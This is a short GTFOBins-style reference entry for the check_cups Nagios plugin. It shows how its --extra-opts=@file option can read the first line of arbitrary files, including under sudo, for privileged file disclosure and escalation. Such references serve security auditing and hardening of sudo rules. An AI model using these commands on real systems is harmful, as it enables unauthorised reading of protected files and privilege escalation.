# GTFOBin: check_cups

This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
check_cups --extra-opts=@$LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo check_cups --extra-opts=@$LFILE
```